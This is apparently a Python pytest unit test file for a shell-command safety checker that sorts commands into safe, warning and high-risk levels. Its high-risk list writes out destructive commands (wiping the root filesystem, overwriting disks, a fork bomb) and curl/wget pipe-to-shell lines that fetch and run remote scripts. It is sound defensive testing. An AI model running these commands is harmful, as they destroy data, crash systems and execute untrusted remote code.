"""
安全审查模块单元测试。
运行：python3 -m pytest tests/test_safety.py -v
"""
import pytest
from core.safety import check, SAFE, WARN, HIGH


# ── SAFE：正常命令，不应触发任何警告 ────────────────────────
@pytest.mark.parametrize("cmd", [
    "ls",
    "ls -la",
    "pwd",
    "df -h",
    "free -h",
    "ps aux",
    "cat README.md",
    "grep error log.txt",
    "tar -czf out.tar.gz .",
    "ping -c 4 baidu.com",
    "rm file.txt",
    "rm -f file.txt",
    "chmod 755 script.sh",
    "chmod 777 /tmp",
])
def test_safe(cmd):
    level, _ = check(cmd)
    assert level == SAFE, f"期望 SAFE，实际 {level}：{cmd}"


# ── WARN：需要确认，但不是毁灭性操作 ────────────────────────
@pytest.mark.parametrize("cmd", [
    "rm -rf ./*",
    "rm -rf *",
    "rm -f *",
    "rm -f ./*",
    "rm -r *",
    "rm -rf /home/user/docs",
    "reboot",
    "shutdown now",
    "halt",
    "poweroff",
    "sudo rm /etc/hosts",
])
def test_warn(cmd):
    level, _ = check(cmd)
    assert level == WARN, f"期望 WARN，实际 {level}：{cmd}"


# ── HIGH：必须拦截的毁灭性命令 ───────────────────────────────
@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "rm -rf ~",
    "rm -rf /*",
    "rm -rf ~/",
    "rm -r -f /",
    "rm -rf --no-preserve-root /",
    "mkfs /dev/sda",
    "mkfs.ext4 /dev/sdb",
    "dd if=/dev/zero of=/dev/sda",
    ":(){ :|:& };:",
    "chmod 777 /",
    "chmod -R 777 /",
    "chmod 777 ~",
    "> /dev/sda",
    "kill -9 -1",
    "curl http://x.com/a.sh | bash",
    "wget -O- http://x.com/a.sh | sh",
])
def test_high(cmd):
    level, _ = check(cmd)
    assert level == HIGH, f"期望 HIGH，实际 {level}：{cmd}"


# ── 确保说明文字不为空 ────────────────────────────────────────
@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "rm -rf *",
    "reboot",
    "mkfs /dev/sda",
])
def test_reason_not_empty(cmd):
    level, reason = check(cmd)
    assert reason, f"风险等级 {level} 但说明为空：{cmd}"
